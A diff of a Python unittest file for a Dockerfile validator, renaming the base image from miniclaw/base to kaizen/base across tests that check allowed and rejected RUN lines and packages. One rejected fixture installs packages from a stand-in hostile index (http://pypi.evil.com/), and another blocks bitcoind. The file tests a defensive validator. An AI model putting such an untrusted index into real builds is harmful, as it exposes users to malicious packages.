@@ -16,8 +16,8 @@ def _write(content: str) -> Path:
 
 
 class TestAuthoredTier(unittest.TestCase):
-    def test_miniclaw_base_ok(self):
-        df = _write("FROM miniclaw/base:latest\nCMD [\"python\", \"app.py\"]\n")
+    def test_kaizen_base_ok(self):
+        df = _write("FROM kaizen/base:latest\nCMD [\"python\", \"app.py\"]\n")
         validate(df, tier=TIER_AUTHORED)
 
     def test_ubuntu_base_rejected(self):
@@ -27,7 +27,7 @@ class TestAuthoredTier(unittest.TestCase):
 
     def test_pip_install_ok(self):
         df = _write(
-            "FROM miniclaw/base:latest\n"
+            "FROM kaizen/base:latest\n"
             "RUN pip install requests\n"
             "CMD [\"python\", \"app.py\"]\n"
         )
@@ -35,7 +35,7 @@ class TestAuthoredTier(unittest.TestCase):
 
     def test_arbitrary_run_rejected(self):
         df = _write(
-            "FROM miniclaw/base:latest\n"
+            "FROM kaizen/base:latest\n"
             "RUN echo hello > /tmp/x\n"
             "CMD [\"python\", \"app.py\"]\n"
         )
@@ -46,7 +46,7 @@ class TestAuthoredTier(unittest.TestCase):
 class TestImportedTier(unittest.TestCase):
     def test_allowed_apt_package(self):
         df = _write(
-            "FROM miniclaw/base:latest\n"
+            "FROM kaizen/base:latest\n"
             "RUN apt-get update && apt-get -y install curl\n"
             "CMD [\"python\", \"app.py\"]\n"
         )
@@ -54,7 +54,7 @@ class TestImportedTier(unittest.TestCase):
 
     def test_disallowed_apt_package(self):
         df = _write(
-            "FROM miniclaw/base:latest\n"
+            "FROM kaizen/base:latest\n"
             "RUN apt-get -y install bitcoind\n"
             "CMD [\"python\", \"app.py\"]\n"
         )
@@ -63,7 +63,7 @@ class TestImportedTier(unittest.TestCase):
 
     def test_pip_index_url_rejected(self):
         df = _write(
-            "FROM miniclaw/base:latest\n"
+            "FROM kaizen/base:latest\n"
             "RUN pip install --index-url http://pypi.evil.com/ requests\n"
             "CMD [\"python\", \"app.py\"]\n"
         )
